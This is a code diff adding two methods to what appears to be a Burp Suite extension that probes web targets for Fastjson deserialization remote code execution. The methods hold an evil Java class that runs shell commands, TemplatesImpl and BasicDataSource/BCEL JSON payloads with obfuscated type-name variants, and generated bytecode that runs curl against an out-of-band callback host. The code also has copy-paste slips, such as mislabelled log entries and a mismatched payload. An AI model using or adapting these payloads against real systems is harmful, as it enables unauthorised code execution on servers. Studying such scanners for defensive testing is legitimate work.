@@ -567,6 +567,155 @@ public class FastJson {
         }
     }
 
+    public static void BasicDataSource_0() {
+        String poc = "##Condition##\n" +
+                "1.2.22 < version <= 1.2.24 + JDK1.8.0_102/1.7\n\n" +
+                "##Evil class##\n" +
+                "public class Exploit {\n" +
+                "    public Exploit() {\n" +
+                "    }\n" +
+                "\n" +
+                "    static {\n" +
+                "        try {\n" +
+                "            String var0 = \"ifconfig\";\n" +
+                "            String[] var1 = System.getProperty(\"os.name\").toLowerCase().contains(\"win\") ? new String[]{\"cmd\", \"/c\", var0} : new String[]{\"/bin/bash\", \"-c\", var0};\n" +
+                "            Process var2 = Runtime.getRuntime().exec(var1);\n" +
+                "            var2.waitFor();\n" +
+                "        } catch (Exception var4) {\n" +
+                "            var4.printStackTrace();\n" +
+                "        }\n" +
+                "\n" +
+                "    }\n" +
+                "}\n\n" +
+                "##Step1##\n make evil class\n" +
+                "    javac Exploit.java\n\n" +
+                "##Step2##\n make evil class to byte\n" +
+                "    public static String readClass(String clsFile){\n" +
+                "        ByteArrayOutputStream bos = new ByteArrayOutputStream();\n" +
+                "        try {\n" +
+                "            IOUtils.copy(new FileInputStream(new File(clsFile)), bos);\n" +
+                "        } catch (IOException e) {\n" +
+                "            e.printStackTrace();\n" +
+                "        }\n" +
+                "        return Base64.encodeBase64String(bos.toByteArray()); //Base64 form commons.codec\n" +
+                "    }\n\n" +
+                "#Poc:\n" +
+                "{\"@type\":\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\",\"_bytecodes\":[\"###EVIL_CODE###\"],'_name':'a.b','_tfactory':{ },\"_outputProperties\":{ },\"_name\":\"a\",\"_version\":\"1.0\",\"allowedProtocols\":\"all\"}"+
+                "{\"@type\":\"\\x63\\x6f\\x6d.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\",\"_bytecodes\":[\"###EVIL_CODE###\"],'_name':'a.b','_tfactory':{ },\"_outputProperties\":{ },\"_name\":\"a\",\"_version\":\"1.0\",\"allowedProtocols\":\"all\"}" +
+                "{\"@type\":\"\\u0063\\u006f\\u006d.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\",\"_bytecodes\":[\"###EVIL_CODE###\"],'_name':'a.b','_tfactory':{ },\"_outputProperties\":{ },\"_name\":\"a\",\"_version\":\"1.0\",\"allowedProtocols\":\"all\"}";
+
+        // 1.2.24 + JDK1.8.0_102
+        IBurpCollaboratorClientContext collaboratorClientContext = BurpExtender.callbacks.createBurpCollaboratorClientContext();
+        String val = collaboratorClientContext.generatePayload(true);
+        //Setp01: 生成exploit bytecode
+        byte[] evil_code = Gadget.getTemplatesImpl2ExpCode("curl http://" + val);
+        //Setp02:生成payload
+        String base64Code = Base64.encodeBase64String(evil_code);
+        // 据说可以覆盖所有版本
+        String payload = "{\"@type\":\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\",\"_bytecodes\":[\"###EVIL_CODE###\"],'_name':'a.b','_tfactory':{ },\"_outputProperties\":{ },\"_name\":\"a\",\"_version\":\"1.0\",\"allowedProtocols\":\"all\"}".replace("###EVIL_CODE###", base64Code);
+
+        // fix: java.lang.RuntimeException: Extensions should not make HTTP requests in the Swing event dispatch thread
+        // swing事件是在特殊的线程中执行，发起http请求需要另外的线程进行
+        HttpRequestThread httpRequestThread = new HttpRequestThread(payload);
+        try {
+            Thread thread = new Thread(httpRequestThread);
+            thread.start();
+            // // 等待，直到运行结束
+            thread.join();
+        } catch (Exception e) {
+            OutputStream out = BurpExtender.callbacks.getStderr();
+            PrintWriter p = new PrintWriter(out);
+            e.printStackTrace(p);
+            try {
+                p.flush();
+                out.flush();
+            } catch (IOException ioException) {
+                ioException.printStackTrace();
+            }
+        }
+        HttpResult httpResult = httpRequestThread.getResulemessageInfo();
+        if (httpResult != null && collaboratorClientContext.fetchCollaboratorInteractionsFor(val).size() != 0) {
+            BurpExtender.log.add(new BurpExtender.LogEntry(BurpExtender.log.size(), BurpExtender.callbacks.saveBuffersToTempFiles(httpResult.httpRequestResponse), httpResult.Url, "JdbcRowSetImpl_4", poc, "hack!"));
+        } else {
+            BurpExtender.log.add(new BurpExtender.LogEntry(BurpExtender.log.size(), BurpExtender.callbacks.saveBuffersToTempFiles(httpResult.httpRequestResponse), httpResult.Url, "JdbcRowSetImpl_4", poc, "pass"));
+        }
+    }
+
+    public static void BasicDataSource_1() {
+        String poc = "##Condition##\n" +
+                "1.2.22 < version <= 1.2.24 + JDK1.8.0_102/1.7\n\n" +
+                "##Evil class##\n" +
+                "public class Exploit {\n" +
+                "    public Exploit() {\n" +
+                "    }\n" +
+                "\n" +
+                "    static {\n" +
+                "        try {\n" +
+                "            String var0 = \"ifconfig\";\n" +
+                "            String[] var1 = System.getProperty(\"os.name\").toLowerCase().contains(\"win\") ? new String[]{\"cmd\", \"/c\", var0} : new String[]{\"/bin/bash\", \"-c\", var0};\n" +
+                "            Process var2 = Runtime.getRuntime().exec(var1);\n" +
+                "            var2.waitFor();\n" +
+                "        } catch (Exception var4) {\n" +
+                "            var4.printStackTrace();\n" +
+                "        }\n" +
+                "\n" +
+                "    }\n" +
+                "}\n\n" +
+                "##Step1##\n make evil class\n" +
+                "    javac Exploit.java\n\n" +
+                "##Step2##\n make evil class to byte\n" +
+                "    public static String readClass(String clsFile){\n" +
+                "        ByteArrayOutputStream bos = new ByteArrayOutputStream();\n" +
+                "        try {\n" +
+                "            IOUtils.copy(new FileInputStream(new File(clsFile)), bos);\n" +
+                "        } catch (IOException e) {\n" +
+                "            e.printStackTrace();\n" +
+                "        }\n" +
+                "        return Base64.encodeBase64String(bos.toByteArray()); //Base64 form commons.codec\n" +
+                "    }\n\n" +
+                "#Poc:\n" +
+                "{{\"@type\":\"com.alibaba.fastjson.JSONObject\",\"c\":{\"@type\":\"org.apache.commons.dbcp.BasicDataSource\",\"driverClassLoader\":{\"@type\":\"com.sun.org.apache.bcel.internal.util.ClassLoader\"},\"driverClassName\":\"###EVIL_CODE###\"}}:\"ddd\"}"+
+                "{{\"@type\":\"\\x63\\x6f\\x6d.alibaba.fastjson.JSONObject\",\"c\":{\"@type\":\"org.apache.commons.dbcp.BasicDataSource\",\"driverClassLoader\":{\"@type\":\"com.sun.org.apache.bcel.internal.util.ClassLoader\"},\"driverClassName\":\"###EVIL_CODE###\"}}:\"ddd\"}" +
+                "{{\"@type\":\"\\u0063\\u006f\\u006d.alibaba.fastjson.JSONObject\",\"c\":{\"@type\":\"org.apache.commons.dbcp.BasicDataSource\",\"driverClassLoader\":{\"@type\":\"com.sun.org.apache.bcel.internal.util.ClassLoader\"},\"driverClassName\":\"###EVIL_CODE###\"}}:\"ddd\"}";
+
+
+        // 1.2.24 + JDK1.8.0_102
+        IBurpCollaboratorClientContext collaboratorClientContext = BurpExtender.callbacks.createBurpCollaboratorClientContext();
+        String val = collaboratorClientContext.generatePayload(true);
+        //Setp01: 生成exploit bytecode
+        byte[] evil_code = Gadget.getTemplatesImpl2ExpCode("curl http://" + val);
+        //Setp02:生成payload
+        String base64Code = Base64.encodeBase64String(evil_code);
+        // 据说可以覆盖所有版本
+        String payload = "{{\"@type\":\"com.alibaba.fastjson.JSONObject\",\"c\":{\"@type\":\"org.apache.commons.dbcp.BasicDataSource\",\"driverClassLoader\":{\"@type\":\"com.sun.org.apache.bcel.internal.util.ClassLoader\"},\"driverClassName\":\"###EVIL_CODE###\"}}:\"ddd\"}".replace("###EVIL_CODE###", base64Code);
+
+        // fix: java.lang.RuntimeException: Extensions should not make HTTP requests in the Swing event dispatch thread
+        // swing事件是在特殊的线程中执行，发起http请求需要另外的线程进行
+        HttpRequestThread httpRequestThread = new HttpRequestThread(payload);
+        try {
+            Thread thread = new Thread(httpRequestThread);
+            thread.start();
+            // // 等待，直到运行结束
+            thread.join();
+        } catch (Exception e) {
+            OutputStream out = BurpExtender.callbacks.getStderr();
+            PrintWriter p = new PrintWriter(out);
+            e.printStackTrace(p);
+            try {
+                p.flush();
+                out.flush();
+            } catch (IOException ioException) {
+                ioException.printStackTrace();
+            }
+        }
+        HttpResult httpResult = httpRequestThread.getResulemessageInfo();
+        if (httpResult != null && collaboratorClientContext.fetchCollaboratorInteractionsFor(val).size() != 0) {
+            BurpExtender.log.add(new BurpExtender.LogEntry(BurpExtender.log.size(), BurpExtender.callbacks.saveBuffersToTempFiles(httpResult.httpRequestResponse), httpResult.Url, "JdbcRowSetImpl_4", poc, "hack!"));
+        } else {
+            BurpExtender.log.add(new BurpExtender.LogEntry(BurpExtender.log.size(), BurpExtender.callbacks.saveBuffersToTempFiles(httpResult.httpRequestResponse), httpResult.Url, "JdbcRowSetImpl_4", poc, "pass"));
+        }
+    }
+
 
     public static void JndiDataSourceFactory() {
         String poc = "##Condition##\n" +
